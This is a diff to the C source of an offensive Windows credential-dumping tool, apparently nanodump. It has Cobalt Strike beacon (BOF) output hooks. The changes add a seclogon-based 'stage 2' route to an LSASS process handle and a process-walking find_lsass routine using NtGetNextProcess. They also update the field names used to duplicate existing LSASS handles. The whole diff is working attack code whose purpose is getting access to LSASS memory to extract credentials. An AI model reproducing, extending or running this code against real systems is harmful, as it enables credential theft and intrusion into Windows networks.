@@ -1,35 +1,46 @@
 #include "../include/handle.h"
 #include "../include/modules.h"
+#include "../include/malseclogon.h"
 
 HANDLE obtain_lsass_handle(
     DWORD pid,
     BOOL fork,
-    BOOL dup
+    BOOL dup,
+    BOOL is_seclogon_stage_2,
+    LPCSTR dump_name
 )
 {
     HANDLE hProcess;
-    if (pid)
+    if (is_seclogon_stage_2)
     {
-        if (fork)
-        {
-            hProcess = fork_lsass_process(
-                pid
-            );
-        }
-        else if (dup)
-        {
-            hProcess = duplicate_lsass_handle(
-                pid
-            );
-        }
-        else
-        {
-            hProcess = get_process_handle(
-                pid,
-                LSASS_PERMISSIONS,
-                FALSE
-            );
-        }
+        // this is always done from an EXE
+#ifndef BOF
+        hProcess = seclogon_stage_2(
+            dump_name
+        );
+        // give LSASS a moment to process the new (fake) credentials
+        sleep(5);
+#endif
+    }
+    else if (fork)
+    {
+        hProcess = fork_lsass_process(
+            pid
+        );
+    }
+    else if (dup)
+    {
+        hProcess = duplicate_lsass_handle(
+            pid
+        );
+    }
+    else if (pid)
+    {
+        hProcess = get_process_handle(
+            pid,
+            LSASS_PERMISSIONS,
+            FALSE
+        );
     }
     else
     {
@@ -38,6 +49,49 @@ HANDLE obtain_lsass_handle(
         );
     }
     return hProcess;
+}
+
+HANDLE find_lsass(DWORD dwFlags)
+{
+    // loop over each process
+    HANDLE hProcess = NULL;
+    while (TRUE)
+    {
+        NTSTATUS status = NtGetNextProcess(
+            hProcess,
+            dwFlags,
+            0,
+            0,
+            &hProcess
+        );
+        if (status == STATUS_NO_MORE_ENTRIES)
+        {
+#ifdef BOF
+            BeaconPrintf(CALLBACK_ERROR,
+#else
+            printf(
+#endif
+                "The LSASS process was not found.\n"
+            );
+            return NULL;
+        }
+        if (!NT_SUCCESS(status))
+        {
+#ifdef DEBUG
+#ifdef BOF
+            BeaconPrintf(CALLBACK_ERROR,
+#else
+            printf(
+#endif
+                "Failed to call NtGetNextProcess, status: 0x%lx\n",
+                status
+            );
+#endif
+            return NULL;
+        }
+        if (is_lsass(hProcess))
+            return hProcess;
+    }
 }
 
 HANDLE get_process_handle(
@@ -229,7 +283,7 @@ PPROCESS_LIST get_processes_from_handle_table(
     {
         handleInfo = (PSYSTEM_HANDLE_TABLE_ENTRY_INFO)&handleTableInformation->Handle[i];
 
-        if (!process_is_included(process_list, handleInfo->ProcessId))
+        if (!process_is_included(process_list, handleInfo->UniqueProcessId))
         {
             if (process_list->Count + 1 > MAX_PROCESSES)
             {
@@ -243,7 +297,7 @@ PPROCESS_LIST get_processes_from_handle_table(
                 intFree(process_list); process_list = NULL;
                 return NULL;
             }
-            process_list->ProcessId[process_list->Count++] = handleInfo->ProcessId;
+            process_list->ProcessId[process_list->Count++] = handleInfo->UniqueProcessId;
         }
     }
     return process_list;
@@ -379,7 +433,7 @@ HANDLE duplicate_lsass_handle(
             PSYSTEM_HANDLE_TABLE_ENTRY_INFO handleInfo = (PSYSTEM_HANDLE_TABLE_ENTRY_INFO)&handleTableInformation->Handle[j];
 
             // make sure this handle is from the current ProcessId
-            if (handleInfo->ProcessId != ProcessId)
+            if (handleInfo->UniqueProcessId != ProcessId)
                 continue;
 
             // make sure the handle has the permissions we need
@@ -387,7 +441,7 @@ HANDLE duplicate_lsass_handle(
                 continue;
 
             // make sure the handle is of type 'Process'
-            if (handleInfo->ObjectTypeNumber != ProcesTypeIndex)
+            if (handleInfo->ObjectTypeIndex != ProcesTypeIndex)
                 continue;
 
             if (!hProcess)
@@ -406,7 +460,7 @@ HANDLE duplicate_lsass_handle(
             HANDLE hDuped = NULL;
             status = NtDuplicateObject(
                 hProcess,
-                (HANDLE)(DWORD_PTR)handleInfo->Handle,
+                (HANDLE)(DWORD_PTR)handleInfo->HandleValue,
                 NtCurrentProcess(),
                 &hDuped,
                 LSASS_PERMISSIONS,
@@ -424,9 +478,9 @@ HANDLE duplicate_lsass_handle(
 #else
                 printf(
 #endif
-                    "Found LSASS handle: 0x%x, on process: %ld\n",
-                    handleInfo->Handle,
-                    handleInfo->ProcessId
+                    "Found LSASS handle: 0x%x, on process: %d\n",
+                    handleInfo->HandleValue,
+                    handleInfo->UniqueProcessId
                 );
                 intFree(handleTableInformation); handleTableInformation = NULL;
                 intFree(process_list); process_list = NULL;
